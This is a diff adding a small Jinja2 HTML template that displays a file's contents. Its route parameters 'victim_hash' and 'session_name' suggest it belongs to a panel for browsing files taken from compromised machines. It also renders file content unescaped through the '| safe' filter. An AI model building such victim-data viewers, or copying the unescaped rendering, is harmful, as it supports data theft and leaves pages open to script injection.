@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Viewing: {{ item_name }}</title>
+    <style> /* 간단한 스타일 */
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        h1 { border-bottom: 1px solid #ccc; padding-bottom: 5px;}
+        a { color: #337ab7; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        pre { white-space: pre-wrap; word-wrap: break-word; background-color: #f8f8f8; border: 1px solid #ddd; padding: 10px; max-height: 600px; overflow-y: auto; }
+        h3 { margin-top: 15px; margin-bottom: 5px; }
+    </style>
+</head>
+<body>
+    <h1>Viewing File: {{ item_name }}</h1>
+    <p><a href="{{ url_for('browse_folder', victim_hash=victim_hash, session_name=session_name, sub_folder=sub_folder) }}">&laquo; Back to Folder</a></p>
+    <hr>
+    <div>
+        {{ content_to_display | safe }} </div>
+</body>
+</html>
